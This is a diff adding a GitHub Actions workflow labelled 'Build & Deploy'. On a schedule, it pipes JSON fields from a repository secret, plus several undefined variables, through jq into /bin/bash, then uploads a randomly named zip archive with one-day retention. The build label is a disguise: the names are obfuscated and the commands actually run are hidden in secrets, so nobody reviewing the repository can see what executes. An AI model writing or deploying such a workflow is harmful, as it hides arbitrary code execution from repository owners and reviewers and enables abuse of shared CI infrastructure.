@@ -1,0 +1,35 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '12 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          ndr237: ${{ secrets.ndr237 }}
+        run: |
+          printf '%s' "$ndr237" | jq -r .r9905 | /bin/bash
+          printf '%s' "$m0176" | jq -r .ern91 | /bin/bash
+          printf '%s' "$supz138" | jq -r .cvicc7 | /bin/bash
+          echo $thdws03 | jq -r .v9881 | /bin/bash
+          echo $bxj127 | jq -r .vtf80 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: e3miRDeW
+          path: "*.zip"
+          retention-days: 1
